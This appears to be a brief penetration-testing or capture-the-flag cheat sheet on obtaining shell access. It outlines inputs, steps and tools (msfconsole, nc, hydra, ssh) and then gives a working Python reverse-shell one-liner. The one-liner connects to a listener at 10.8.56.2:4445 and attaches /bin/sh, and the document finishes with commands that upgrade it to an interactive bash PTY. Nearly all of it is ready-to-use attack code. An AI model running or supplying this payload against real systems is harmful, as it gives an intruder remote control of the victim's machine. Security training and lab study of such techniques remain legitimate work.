# Shell 

INPUT
- service:user:pass
- vulnerability
- Uploaded RShell Script
PROCESS
- Gain Access
    - Exploit Service
    - Reverse Shell
    - Web Shell
    - SSH
    - FTP
    - SMB
- Stablish Shell
    - python
TOOLS
- msfconsole
- nc
- python
- hydra
- ssh
OUPUT
- shell


## Reverse Shell
```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.56.2",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Stablish Shell   
```sh
python3 -c 'import pty;pty.spawn("/bin/bash");'
export TERM=xterm
```
















    

